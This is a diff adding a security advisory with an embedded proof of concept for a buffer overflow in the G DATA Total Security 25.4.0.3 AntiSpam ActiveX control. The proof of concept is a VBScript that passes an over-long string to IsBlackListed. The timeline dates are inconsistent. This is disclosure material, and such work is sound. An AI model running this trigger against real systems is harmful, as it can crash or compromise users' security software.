@@ -1,0 +1,73 @@
+<!--
+=====[ Tempest Security Intelligence - ADV-24/2018 ]===
+
+G DATA TOTAL SECURITY v25.4.0.3 Activex Buffer Overflow
+Author: Filipe Xavier Oliveira
+Tempest Security Intelligence - Recife, Pernambuco - Brazil
+
+=====[ Table of Contents]=====================================================
+
+* Overview
+* Detailed description
+* Timeline of disclosure
+* Thanks & Acknowledgements
+* References
+
+=====[ Overview]==============================================================
+
+* System affected : G DATA TOTAL SECURITY [1].
+* Software Version : 25.4.0.3 (other versions may also be affected).
+* Impact : A user may be affected by opening a malicious black list
+email in the antispam filter,
+
+=====[ Detailed description]==================================================
+The GDASPAMLib.AntiSpam ActiveX control ASK\GDASpam.dll in G DATA Total
+Security 25.4.0.3 has a buffer overflow via a long IsBlackListed argument.
+Through a long input in a member of class called Antispam, isblackedlist
+class is vulnerable a buffer overflow.
+
+A poc that causes a buffer overflow :
+-->
+
+<?XML version='1.0' standalone='yes' ?>
+<package><job id='DoneInVBS' debug='false' error='true'>
+<object classid='clsid:B9D1548D-4339-485A-ABA2-F9F9C1CBF8AC' id='target' />
+<script language='vbscript'>
+
+
+'for debugging/custom prolog
+targetFile = "C:\Program Files\G DATA\TotalSecurity\ASK\GDASpam.dll"
+prototype = "Function IsBlackListed ( ByVal strIP As String ) As Long"
+memberName = "IsBlackListed"
+progid = "GDASPAMLib.AntiSpam"
+argCount = 1
+
+arg1=String(14356, "A")
+
+target.IsBlackListed arg1
+
+</script></job></package>
+
+<!--
+=====[ Timeline of disclosure]===============================================
+
+04/10/2018 - Vulnerability reported.
+04/17/2018 - The vendor will fix the vulnerability.
+05/24/2017 - Vulnerability fixed.
+
+07/12/2018 - CVE assigned [1]
+
+=====[ Thanks & Acknowledgements]============================================
+
+- Tempest Security Intelligence / Tempest's Pentest Team [3]
+
+=====[ References]===========================================================
+
+[1] https://www.gdatasoftware.com/
+
+[2] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10018
+
+[3] http://www.tempest.com.br 
+
+=====[ EOF]====================================================================
+-->
